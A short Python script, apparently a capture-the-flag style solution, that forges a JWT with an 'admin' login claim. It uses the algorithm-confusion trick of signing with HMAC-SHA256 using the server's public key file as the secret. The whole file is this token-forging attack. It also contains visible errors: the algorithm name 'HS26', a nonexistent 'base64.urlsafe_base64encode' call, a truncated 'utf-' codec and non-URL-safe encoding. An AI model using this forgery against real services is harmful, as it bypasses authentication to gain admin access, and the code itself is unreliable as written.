import hmac
import hashlib
import base64
import json


key = open("/Users/joker/Downloads/public.pem", "r").read()
header = '{"typ":"JWT","alg":"HS26"}\n'
payload = '{"login":"admin"}\n'

b_header = base64.b64encode(header.encode('utf-8')).decode('utf-8').rstrip("=")
b_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8').rstrip("=")

token_no_sig = (b_header + "." + b_payload)

signature = hmac.new( bytes(key,'utf8'), token_no_sig.encode('utf-8'), digestmod=hashlib.sha256 ).digest()
print(token_no_sig + "." + base64.urlsafe_base64encode(signature).decode('utf-').rstrip("="))